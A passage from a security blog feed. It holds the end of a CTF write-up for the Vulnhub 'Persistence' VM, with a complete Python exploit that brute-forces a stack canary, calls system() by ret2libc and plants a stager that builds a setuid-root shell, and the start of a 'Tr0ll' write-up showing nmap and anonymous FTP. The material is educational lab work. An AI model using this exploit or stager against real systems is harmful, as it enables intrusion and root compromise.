&lt;li&gt;&lt;a href=&#34;http://fluxius.handgrep.se/2011/10/20/the-art-of-elf-analysises-and-exploitations/&#34;&gt;The Art Of ELF: Analysis and Exploitations&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.pwntester.com/blog/2013/12/31/fusion-level04-write-up/&#34;&gt;Fusion level04 write-up&lt;/a&gt; (SPOILER ALERTS for another CTF)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Now, remember I mentioned &lt;code&gt;fork()&lt;/code&gt; earlier on? From the Phrack article, we can read some interesting ideas about binaries that make use of &lt;code&gt;fork()&lt;/code&gt; and how this affects stack cookies.&lt;/p&gt;

&lt;p&gt;From &lt;code&gt;man 2 fork&lt;/code&gt;&amp;rsquo;s description:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;DESCRIPTION
     Fork() causes creation of a new process.  The new process (child process)
     is an exact copy of the calling process (parent process) except for the
     following:

 [.. snip ..]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;What this means for us then is that every time we have a new &lt;code&gt;fork()&lt;/code&gt; happen, the stack cookie will supposedly remain constant between forks as it comes from the parent. &lt;em&gt;”Soooooooo what?”&lt;/em&gt; I hear you say! Well, that means we can attempt to try all of the possible ASCII characters as hex, 4 times (for 4 bytes), to try and brute force this value!&lt;/p&gt;

&lt;p&gt;The theory for this was great, but the practice was a different story. In order to perform a successful brute force, at the very minimum, I needed a reliable way to determine a correct and incorrect value. With my local copy of &lt;code&gt;wopr&lt;/code&gt;, I can just watch the console output, however, I don&amp;rsquo;t have that luxury on the Persistence VM!&lt;/p&gt;

&lt;p&gt;While thinking about this problem, I started to code a little script to start the juices flowing in getting this brute force right. The basic idea was to have a nested xrange(4) -&amp;gt; xrange(255) concat the values to a variable as they are determined. While tinkering with the script and the TCP socket code, I started to realize that there may actually be a way to remotely determine a failed and successful attempt!&lt;/p&gt;

&lt;p&gt;When a string of less than 30 A&amp;rsquo;s is sent, the server will send a &amp;ldquo;[+] bye!&amp;rdquo; message before closing the socket. More than 30 A&amp;rsquo;s, and the socket is killed before the bye&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# telnet 127.0.0.1 3333
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is &#39;^]&#39;.
[+] hello, my name is sploitable
[+] would you like to play a game?
&amp;gt; A
[+] yeah, I don&#39;t think so
[+] bye!                           # &amp;lt;-- We have a bye!
Connection closed by foreign host.

root@kali:~# telnet 127.0.0.1 3333
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is &#39;^]&#39;.
[+] hello, my name is sploitable
[+] would you like to play a game?
&amp;gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[+] yeah, I don&#39;t think so
Connection closed by foreign host. # &amp;lt;-- No bye!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This was perfect and exactly what was needed to complete the brute force script! All I had to do was check for the word &lt;em&gt;bye&lt;/em&gt; in the last socket receive to know if we have succeeded or not. The resultant script was therefore:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import socket
import sys

payload = &amp;quot;A&amp;quot; * 30  # amount of bytes before the first canary bit is hit
canary = &amp;quot;&amp;quot;         # the canary

# start the canary brute loop. We want to brute 4 bytes ...
for x in xrange(1,5):

    # ... and try all possibilities
    for canary_byte in xrange(0, 256):

        # prepare the byte
        hex_byte = chr(canary_byte)

        # prepare the payload
        send = payload + canary + hex_byte

        print &amp;quot;[+] Trying: &#39;\\x{0}&#39; in payload &#39;%s&#39; (%d:%d/255)&amp;quot;.format(hex_byte.encode(&amp;quot;hex&amp;quot;)) % (send, x, canary_byte)

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((&#39;127.0.0.1&#39;, 3333))

        # get the inital banners
        sock.recv(35)   # [+] hello, my name is sploitable\n
        sock.recv(40)   # [+] would you like to play a game?\n
        sock.recv(5)    # &amp;gt;

        # send the payload
        sock.send(send)
        sock.recv(27)   # [+] yeah, I don&#39;t think so\n

        # if we have a OK response, then we will have this last part
        # as &#39;[+] bye!\n&#39; populated, if its wrong, not
        data =  sock.recv(64)   # [+] bye!\n
        if &amp;quot;bye&amp;quot; in data:
            print &amp;quot;[!!] Found a possible canary value of &#39;{0}&#39;!&amp;quot;.format(hex_byte.encode(&amp;quot;hex&amp;quot;))
            canary += hex_byte
            sock.close()
            break

        sock.close()

    # if we cant even find the first byte, we failed already
    if len(canary) &amp;lt;= 0:
        print &amp;quot;[-] Unable to even find the first bit. No luck&amp;quot;
        sys.exit(0)

if len(canary) &amp;gt; 0:
    print &amp;quot;[+] Canary seems to be {0}&amp;quot;.format(canary.encode(&amp;quot;hex&amp;quot;))
else:
    print &amp;quot;[-] Unable to brute canary&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;An example run of this would end as follows:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[+] Trying: &#39;\x8d&#39; in payload &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39; (4:141/255)
[+] Trying: &#39;\x8e&#39; in payload &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39; (4:142/255)
[+] Trying: &#39;\x8f&#39; in payload &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39; (4:143/255)
[+] Trying: &#39;\x90&#39; in payload &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39; (4:144/255)
[!!] Found a possible canary value of &#39;90&#39;!
[+] Canary seems to be 00ef8d90
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Winning. Just to make 100% sure I actually have the correct canary, I made another small socket program just to append the canary to the initial 30 A&amp;rsquo;s and send it. No stack smashing message appeared and we got the &lt;em&gt;bye&lt;/em&gt; message :)&lt;/p&gt;

&lt;h2 id=&#34;wopr-nx-and-eip&#34;&gt;wopr - NX and EIP&lt;/h2&gt;

&lt;p&gt;If you can recall from earlier, &lt;code&gt;wopr&lt;/code&gt; was compiled with the NX bit set. Effectively that means we can&amp;rsquo;t simply exploit this vulnerability by setting EIP to the beginning of shellcode we simply sent along with the payload as the stack is not executable. Thankfully though, there is a concept such as ret2libc.&lt;/p&gt;

&lt;p&gt;The idea behind ret2libc is to steer the application flow to useful commands within libc itself, and get code execution that way. A very popular function to use is the &lt;code&gt;system()&lt;/code&gt; command, for almost obvious reasons.&lt;/p&gt;

&lt;p&gt;I decided to make use of the same method. I quickly checked to see if ASLR was enabled on the Persistence VM:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;bash-4.1$ ldd /usr/local/bin/wopr
    linux-gate.so.1 =&amp;gt;  (0xb7fff000)
    libc.so.6 =&amp;gt; /lib/libc.so.6 (0xb7e62000)
    /lib/ld-linux.so.2 (0x00110000)

bash-4.1$ ldd /usr/local/bin/wopr
    linux-gate.so.1 =&amp;gt;  (0xb7fff000)
    libc.so.6 =&amp;gt; /lib/libc.so.6 (0xb7e62000)
    /lib/ld-linux.so.2 (0x00110000)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The addresses for the linked files remained static between all of the lookups, indicating that ASLR was not enabled. This makes things slightly easier. Because this is a 32bit OS though, even if it was enabled it would not have been too much of a issue :)&lt;/p&gt;

&lt;p&gt;The next step was to find out where system() lived in libc. This is also a very easy step to perform. A interesting note here. GDB was using the SHELL env variable for commands, and because I have come from rbash, it was still set to that. A simple &lt;code&gt;export SHELL=/bin/bash&lt;/code&gt; fixed it though. Also, just to be clear, I am now doing this address lookup on the Persistence VM, however I had to do exactly the same thing on the Kali VM where I was building my exploit.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;bash-4.1$ export SHELL=/bin/bash

bash-4.1$ gdb -q /usr/bin/telnet
Reading symbols from /usr/bin/telnet...(no debugging symbols found)...done.
Missing separate debuginfos, use: debuginfo-install telnet-0.17-47.el6_3.1.i686
(gdb) b *main   # set a breakpoint to stop the flow once we hit the main() func
Breakpoint 1 at 0x7b90

(gdb) r         # run the program
Starting program: /usr/bin/telnet
Breakpoint 1, 0x00117b90 in main ()

(gdb) p system  # We hit our breakpoint, lets leak the address for system()
$1 = {&amp;lt;text variable, no debug info&amp;gt;} 0xb7e56210 &amp;lt;system&amp;gt;
(gdb)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We find &lt;code&gt;system()&lt;/code&gt; at &lt;code&gt;0xb7e56210&lt;/code&gt;. I used the telnet binary simply because it is also linked to libc.&lt;/p&gt;

&lt;p&gt;So to sum up what we have so far, lets take another look at what the stack will look like now when sending our exploit payload:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;- -&amp;gt;         - -&amp;gt;        [42 Bytes  in Total]        - -&amp;gt;           - &amp;gt;

[   A x 30   ] [  \xff\xff\xff\xff  ] [  AAAA  ] [  \x10\x62\xe5\xb7  ]
 ^~ Initial BF    ^~ Bruted cookie                    ^~ system()

- -&amp;gt;         - -&amp;gt;        [42 Bytes  in Total]        - -&amp;gt;           - &amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The address for &lt;code&gt;system()&lt;/code&gt; is &amp;lsquo;backwards&amp;rsquo; because we are working with a &lt;a href=&#34;http://en.wikipedia.org/wiki/Endianness&#34;&gt;little endian&lt;/a&gt; system. The 4 * A before the address to &lt;code&gt;system()&lt;/code&gt; is simply padding to EIP.&lt;/p&gt;

&lt;h2 id=&#34;wopr-code-exec&#34;&gt;wopr - code exec&lt;/h2&gt;

&lt;p&gt;This part, by far, took me &lt;strong&gt;the longest&lt;/strong&gt; of the entire challenge!&lt;/p&gt;

&lt;p&gt;The next step was to get actual code to execute using &lt;code&gt;system()&lt;/code&gt;. While this may sound trivial, it has challenges of its own. One of the key things I had to realize whilst getting frustrated with this was &amp;ldquo;to remember, you are trying to make a program do what it is not intended to do, expect difficulty!&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;I tried to put a command in a env variable and failed.
I attempted to write a ROP chain and failed.&lt;/p&gt;

&lt;p&gt;These failed mostly due to by own lack of understanding, tiredness and frustration. My attempts generally was to get a script &lt;code&gt;/tmp/runme&lt;/code&gt; to run. &lt;code&gt;runme&lt;/code&gt; was a bash script that will compile a small C shell, change ownership and set the suid bit. Yes, Persistence had &lt;code&gt;gcc&lt;/code&gt; installed :)&lt;/p&gt;

&lt;p&gt;&amp;ldquo;fail&amp;rdquo; * 100000 * 100000. That is a rough guestimate of the amount of times I tried this part.&lt;/p&gt;

&lt;p&gt;Eventually, I finally came to the realization that I may have to search for other avenues of code execution. In fact, I completely stepped away from the VM and did something else.&lt;/p&gt;

&lt;p&gt;Returning later with a fresh look, I run wopr through &lt;code&gt;strings&lt;/code&gt; one more time:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~/Desktop/persistence# strings  wopr
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used

[.. snip ..]

[^_]
[+] yeah, I don&#39;t think so
socket
setsockopt
bind
[+] bind complete
listen
/tmp/log          # &amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;
TMPLOG
[+] waiting for connections
[+] logging queries to $TMPLOG
accept
[+] got a connection
[+] hello, my name is sploitable
[+] would you like to play a game?
[+] bye!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;See that? Can you &lt;strong&gt;see&lt;/strong&gt; that&amp;hellip; We have &lt;code&gt;/tmp/log&lt;/code&gt; RIGHT THERE!&lt;/p&gt;

&lt;p&gt;I confirmed that &lt;code&gt;/tmp/log&lt;/code&gt; wasn&amp;rsquo;t actually in use, and moved my original &lt;code&gt;/tmp/runme&lt;/code&gt; script there.&lt;/p&gt;

&lt;p&gt;The only thing that was left now was to find the location of the string &lt;code&gt;/tmp/log&lt;/code&gt; in &lt;code&gt;wopr&lt;/code&gt;, push that to the stack, and ride the bus home. So lets do the hard work required to find this valuable piece of the puzzle:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# gdb -q ./wopr
Reading symbols from wopr...(no debugging symbols found)...done.

gdb-peda$ b *main
Breakpoint 1 at 0x80487de

gdb-peda$ r
[----------------------------------registers-----------------------------------]
EAX: 0xbffff4a4 --&amp;gt; 0xbffff60a (&amp;quot;wopr&amp;quot;)
EBX: 0xb7fbfff4 --&amp;gt; 0x14bd7c
ECX: 0x66a6f92e
EDX: 0x1
ESI: 0x0
EDI: 0x0
EBP: 0xbffff478 --&amp;gt; 0x0
ESP: 0xbffff3fc --&amp;gt; 0xb7e8ae36 (&amp;lt;__libc_start_main+230&amp;gt;:    mov    DWORD PTR [esp],eax)
EIP: 0x80487de (&amp;lt;main&amp;gt;: push   ebp)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80487d7 &amp;lt;get_reply+99&amp;gt;:    call   0x804865c &amp;lt;__stack_chk_fail@plt&amp;gt;
   0x80487dc &amp;lt;get_reply+104&amp;gt;:   leave
   0x80487dd &amp;lt;get_reply+105&amp;gt;:   ret
=&amp;gt; 0x80487de &amp;lt;main&amp;gt;:    push   ebp
   0x80487df &amp;lt;main+1&amp;gt;:  mov    ebp,esp
   0x80487e1 &amp;lt;main+3&amp;gt;:  sub    esp,0x258
   0x80487e7 &amp;lt;main+9&amp;gt;:  mov    eax,DWORD PTR [ebp+0x8]
   0x80487ea &amp;lt;main+12&amp;gt;: mov    DWORD PTR [ebp-0x23c],eax
[------------------------------------stack-------------------------------------]
0000| 0xbffff3fc --&amp;gt; 0xb7e8ae36 (&amp;lt;__libc_start_main+230&amp;gt;:   mov    DWORD PTR [esp],eax)
0004| 0xbffff400 --&amp;gt; 0x1
0008| 0xbffff404 --&amp;gt; 0xbffff4a4 --&amp;gt; 0xbffff60a (&amp;quot;wopr&amp;quot;)
0012| 0xbffff408 --&amp;gt; 0xbffff4ac --&amp;gt; 0xbffff629 (&amp;quot;SSH_AGENT_PID=3171&amp;quot;)
0016| 0xbffff40c --&amp;gt; 0xb7fe08d8 --&amp;gt; 0xb7e74000 --&amp;gt; 0x464c457f
0020| 0xbffff410 --&amp;gt; 0xb7ff6821 (mov    eax,DWORD PTR [ebp-0x10])
0024| 0xbffff414 --&amp;gt; 0xffffffff
0028| 0xbffff418 --&amp;gt; 0xb7ffeff4 --&amp;gt; 0x1cf2c
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Breakpoint 1, 0x080487de in main ()

gdb-peda$ searchmem /tmp/log
Searching for &#39;/tmp/log&#39; in: None ranges
Found 2 results, display max 2 items:
wopr : 0x8048c60 (&amp;quot;/tmp/log&amp;quot;)
wopr : 0x8049c60 (&amp;quot;/tmp/log&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;/tmp/log&lt;/code&gt; can be found in 2 places. Lets choose &lt;code&gt;0x8048c60&lt;/code&gt;! Now we finally have everything we need to build the payload to send.&lt;/p&gt;

&lt;h2 id=&#34;wopr-the-exploit&#34;&gt;wopr - the exploit&lt;/h2&gt;

&lt;p&gt;To sum up what we have to do to exploit this, we can say that we have to:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Provide a string of size 30&lt;/li&gt;
&lt;li&gt;Provide the canary we have brute forced&lt;/li&gt;
&lt;li&gt;Pad with 4 bytes&lt;/li&gt;
&lt;li&gt;Write EIP to the location of &lt;code&gt;system()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Provide 4 bytes of JUNK (or the location of &lt;code&gt;exit()&lt;/code&gt; as a return)&lt;/li&gt;
&lt;li&gt;Provide the location of &lt;code&gt;/tmp/log&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In my exploit, as a result of the above, I would therefore send a payload similar to this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;&amp;quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&amp;quot; + &amp;quot;\xff\xff\xff\xff&amp;quot; + &amp;quot;AAAA&amp;quot; +
&amp;quot;\x10\xc2\x16\x00&amp;quot; + &amp;quot;JUNK&amp;quot; + &amp;quot;\x60\x8c\x04\x08&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I finished up coding the exploit, which eventually resulted in the following:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import socket
import sys
import os

payload = &amp;quot;A&amp;quot; * 30  # amount of bytes to before the canary is hit
canary = &amp;quot;&amp;quot;     # canary that should update as its bruted

print &amp;quot;&amp;quot;&amp;quot;
            A: &amp;quot;So, I heard you like pain...?&amp;quot;
            B: &amp;quot;... a bit&amp;quot;
            C: &amp;quot;Well, here it is, the: &amp;quot;
 ____   ___  ____    _____ ____ _____ ______    ___  ____     __    ___
|    \ /  _]|    \  / ___/|    / ___/|      |  /  _]|    \   /  ]  /  _]
|  o  )  [_ |  D  )(   \_  |  (   \_ |      | /  [_ |  _  | /  /  /  [_
|   _/    _]|    /  \__  | |  |\__  ||_|  |_||    _]|  |  |/  /  |    _]
|  | |   [_ |    \  /  \ | |  |/  \ |  |  |  |   [_ |  |  /   \_ |   [_
|  | |     ||  .  \ \    | |  |\    |  |  |  |     ||  |  \     ||     |
|__| |_____||__|\_|  \___||____|\___|  |__|  |_____||__|__|\____||_____|
      _____ ____  _       ___  ____  ______
     / ___/|    \| |     /   \|    ||      |
    (   \_ |  o  ) |    |     ||  | |      |
     \__  ||   _/| |___ |  O  ||  | |_|  |_|
     /  \ ||  |  |     ||     ||  |   |  |
     \    ||  |  |     ||     ||  |   |  |
      \___||__|  |_____| \___/|____|  |__|

                A: &amp;quot;AKA: FU superkojiman &amp;amp;&amp;amp; sagi- !!&amp;quot;
                A: &amp;quot;I also have no idea what I am doing&amp;quot;
&amp;quot;&amp;quot;&amp;quot;

print &amp;quot;[+] Connecting &amp;amp; starting canary brute force...&amp;quot;

# start the canary brute loop. We want to brute 4 bytes ...
for x in xrange(1,5):

    # ... and try all possibilities
    for canary_byte in xrange(0, 256):

        # prepare the byte
        hex_byte = chr(canary_byte)

        # prepare the payload
        send = payload + canary + hex_byte

        # connect and send payload
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((&#39;127.0.0.1&#39;, 3333))

        # get the inital banners
        sock.recv(35)   # [+] hello, my name is sploitable\n
        sock.recv(40)   # [+] would you like to play a game?\n
        sock.recv(5)    # &amp;gt;

        # send the payload
        sock.send(send)
        sock.recv(27)   # [+] yeah, I don&#39;t think so\n

        # if we have a OK response, then we will have this last part
        # as &#39;[+] bye!\n&#39; populated, if its wrong, not
        data =  sock.recv(64)   # [+] bye!\n
        if &amp;quot;bye&amp;quot; in data:
            print &amp;quot;[+] Found a possible canary value of &#39;{0}&#39;!&amp;quot;.format(hex_byte.encode(&amp;quot;hex&amp;quot;))
            canary += hex_byte
            sock.close()
            break

        sock.close()
    # if we cant even find the first byte, we failed already
    if len(canary) &amp;lt;= 0:
        print &amp;quot;[-] Unable to even find the first bit of the canary. No luck&amp;quot;
        sys.exit(0)

# The canary is our ticket out of here!
if len(canary) == 4:

    print &amp;quot;[+] Canary known as : {0}&amp;quot;.format(canary.encode(&amp;quot;hex&amp;quot;))
    print &amp;quot;[+] Writing /tmp/log to be called by wopr later&amp;quot;

    # ./wopr has the string /tmp/log in it. We will use this as
    # our code exec point, overwriting whatever is in it atm
    stager = &amp;quot;&amp;quot;&amp;quot;
        #!/bin/sh

        # First, prepare a small C shell and move it to /tmp with name getroot
        echo &amp;quot;int main(void)\n{\nsetuid(0);\nsystem(\\&amp;quot;/bin/sh\\&amp;quot;);\nreturn 0;\n}&amp;quot; &amp;gt; /tmp/getroot.c

        # compile it
        /usr/bin/gcc /tmp/getroot.c -o /tmp/getroot

        # change ownership and setuid
        /bin/chown root:root /tmp/getroot
        /bin/chmod 4777 /tmp/getroot
    &amp;quot;&amp;quot;&amp;quot;

    # write the file
    with open(&#39;/tmp/log&#39;,&#39;w&#39;) as stager_file:
        stager_file.write(stager)

    # make it executable
    os.chmod(&#39;/tmp/log&#39;, 0755)

    # now, with the stack canary known and the stager ready, lets corrupt
    # EIP and sploit!
    payload += canary               # canary we bruted
    payload += &amp;quot;A&amp;quot; * 4              # padding to EIP wich is at byte 42
    payload += &amp;quot;\x10\x62\xe5\xb7&amp;quot;   # system() @ 0xb7e56210, NULL is ok cause memcpy(). Recheck location of system in gdb incase the sploit fails.
    payload += &amp;quot;JUNK&amp;quot;               # JUNK. Should probably do exit() here. Meh.
    payload += &amp;quot;\x60\x8c\x04\x08&amp;quot;   # location if /tmp/log string in .data

    # and connect &amp;amp;&amp;amp; send
    print &amp;quot;[+] Connecting to service&amp;quot;
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((&#39;127.0.0.1&#39;, 3333))
    sock.recv(35)
    sock.recv(40)
    sock.recv(5)
    print &amp;quot;[+] Sending Payload&amp;quot;
    sock.send(payload)

    sock.recv(64)
    sock.close()
    print &amp;quot;[+] Done&amp;quot;

    print &amp;quot;[+] going to try and spawn /tmp/getroot, assuming the sploit worked :)&amp;quot;
    os.system(&amp;quot;/tmp/getroot&amp;quot;)

else:
    print &amp;quot;[!] Incomplete Canary. Can&#39;t continue reliably&amp;quot;

# done
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A sample run would be:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;bash-4.1$ ls -lah /tmp/sploit.py
-rw-rw-r--. 1 avida avida 4.0K Sep 18 10:33 /tmp/sploit.py
bash-4.1$ python /tmp/sploit.py

            A: &amp;quot;So, I heard you like pain...?&amp;quot;
            B: &amp;quot;... a bit&amp;quot;
            C: &amp;quot;Well, here it is, the: &amp;quot;
 ____   ___  ____    _____ ____ _____ ______    ___  ____     __    ___
|    \ /  _]|    \  / ___/|    / ___/|      |  /  _]|    \   /  ]  /  _]
|  o  )  [_ |  D  )(   \_  |  (   \_ |      | /  [_ |  _  | /  /  /  [_
|   _/    _]|    /  \__  | |  |\__  ||_|  |_||    _]|  |  |/  /  |    _]
|  | |   [_ |    \  /  \ | |  |/  \ |  |  |  |   [_ |  |  /   \_ |   [_
|  | |     ||  .  \ \    | |  |\    |  |  |  |     ||  |  \     ||     |
|__| |_____||__|\_|  \___||____|\___|  |__|  |_____||__|__|\____||_____|
      _____ ____  _       ___  ____  ______
     / ___/|    \| |     /   \|    ||      |
    (   \_ |  o  ) |    |     ||  | |      |
     \__  ||   _/| |___ |  O  ||  | |_|  |_|
     /  \ ||  |  |     ||     ||  |   |  |
     \    ||  |  |     ||     ||  |   |  |
      \___||__|  |_____| \___/|____|  |__|

                A: &amp;quot;AKA: FU superkojiman &amp;amp;&amp;amp; sagi- !!&amp;quot;
                A: &amp;quot;I also have no idea what I am doing&amp;quot;

[+] Connecting &amp;amp; starting canary bruteforce...
[+] Found a possible canary value of &#39;64&#39;!
[+] Found a possible canary value of &#39;d3&#39;!
[+] Found a possible canary value of &#39;c6&#39;!
[+] Found a possible canary value of &#39;15&#39;!
[+] Canary known as : 64d3c615
[+] Writing /tmp/log to be called by wopr later
[+] Connecting to service
[+] Sending Payload
[+] Done
[+] going to try and spawn /tmp/getroot, assuming the sploit worked :)
sh-4.1# id
uid=0(root) gid=500(avida) groups=0(root),500(avida) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And, as proof, we cat the flag!&lt;/p&gt;

&lt;p&gt;```bash Persistence w00t
sh-4.1# cat /root/flag.txt
              .d8888b.  .d8888b. 888
             d88P  Y88bd88P  Y88b888
             888    888888    888888
888  888  888888    888888    888888888
888  888  888888    888888    888888
888  888  888888    888888    888888
Y88b 888 d88PY88b  d88PY88b  d88PY88b.
 &amp;ldquo;Y8888888P&amp;rdquo;  &amp;ldquo;Y8888P&amp;rdquo;  &amp;ldquo;Y8888P&amp;rdquo;  &amp;ldquo;Y888&lt;/p&gt;

&lt;p&gt;Congratulations!!! You have the flag!&lt;/p&gt;

&lt;p&gt;We had a great time coming up with the
challenges for this boot2root, and we
hope that you enjoyed overcoming them.&lt;/p&gt;

&lt;p&gt;Special thanks goes out to @VulnHub for
hosting Persistence for us, and to
@recrudesce for testing and providing
valuable feedback!&lt;/p&gt;

&lt;p&gt;Until next time,
      sagi- &amp;amp; superkojiman
```&lt;/p&gt;

&lt;h2 id=&#34;conclusion&#34;&gt;conclusion&lt;/h2&gt;

&lt;p&gt;Persistence kicked ass!! I learned a ton and that is the ultimate win. Thanks sagi- &amp;amp;&amp;amp; superkojiman for an incredible challenge! Thanks Vulnhub for the hosting and community!&lt;/p&gt;

&lt;h2 id=&#34;thats-not-all&#34;&gt;thats not all&lt;/h2&gt;

&lt;p&gt;There are however a few more things I&amp;rsquo;d like to try.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Find if and how we can root Persistence using &lt;code&gt;sysadmin-tool&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Modify the exploit to a working ROP payload&lt;/li&gt;
&lt;li&gt;Explore other avenues to break out of rbash&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>taming the troll</title>
      <link>https://leonjza.github.io/blog/2014/08/15/taming-the-troll/</link>
      <pubDate>Fri, 15 Aug 2014 07:12:03 +0000</pubDate>
      
      <guid>https://leonjza.github.io/blog/2014/08/15/taming-the-troll/</guid>
      <description>

&lt;h2 id=&#34;foreword&#34;&gt;foreword&lt;/h2&gt;

&lt;p&gt;Having recently started the road to &lt;a href=&#34;http://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/&#34;&gt;OSCP&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/Maleus21&#34;&gt;@Maleus21&lt;/a&gt; released &lt;a href=&#34;http://vulnhub.com/entry/tr0ll-1,100/&#34;&gt;Tr0ll&lt;/a&gt; on &lt;a href=&#34;https://twitter.com/VulnHub&#34;&gt;@VulnHub&lt;/a&gt;. I figured since the description was &lt;em&gt;Difficulty: Beginner ; Type: boot2root&lt;/em&gt;, I could give it a smash in a evening as a bit of distraction.&lt;/p&gt;

&lt;h2 id=&#34;nomad-promise&#34;&gt;nomad, promise&lt;/h2&gt;

&lt;p&gt;As usual, I downloaded the VM, extracted the &lt;code&gt;.rar&lt;/code&gt; and slapped it in Virtual Box. I got the IP 192.168.56.101. Promptly a NMAP was run against it:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# nmap -v --reason -sV 192.168.56.101 -p-

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.2
22/tcp open  ssh     syn-ack (protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.7 ((Ubuntu))
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So, &lt;code&gt;ssh&lt;/code&gt;, &lt;code&gt;ftp&lt;/code&gt;, and &lt;code&gt;http&lt;/code&gt;. Naturally my first reaction was to inspect the web service.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/troll_web.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;The &lt;code&gt;robots.txt&lt;/code&gt; file revealed:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;User-agent:*
Disallow: /secret
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Browsing to &lt;code&gt;/secret&lt;/code&gt; revealed yet another &lt;em&gt;interesting&lt;/em&gt; piece of art:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/troll_secret_path.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Right&amp;hellip; A little early to be &amp;lsquo;mad&amp;rsquo;, but nonetheless, lets move on.&lt;/p&gt;

&lt;h2 id=&#34;anonny-mouse-ftp&#34;&gt;anonny-mouse ftp&lt;/h2&gt;

&lt;p&gt;A quick and lazy google for &lt;code&gt;vsftpd 3.0.2 exploit&lt;/code&gt; didn&amp;rsquo;t reveal anything interesting on page 1, so I lost interest pretty fast. I figured I can just try my luck and attempt to login to the FTP service with anonymous creds:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# ftp 192.168.56.101
Connected to 192.168.56.101.
220 (vsFTPd 3.0.2)
Name (192.168.56.101:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp&amp;gt; ls
500 Illegal PORT command.
ftp: bind: Address already in use

ftp&amp;gt; passive
Passive mode on.

ftp&amp;gt; ls
227 Entering Passive Mode (192,168,56,101,231,190)
150 Here comes the directory listing.
-rwxrwxrwx    1 1000     0            8068 Aug 10 00:43 lol.pcap
226 Directory send OK.

ftp&amp;gt; get lol.pcap
local: lol.pcap remote: lol.pcap
227 Entering Passive Mode (192,168,56,101,189,113)
150 Opening BINARY mode data connection for lol.pcap (8068 bytes).
226 Transfer complete.
8068 bytes received in 0.00 secs (21294.3 kB/s)

ftp&amp;gt; bye
221 Goodbye.
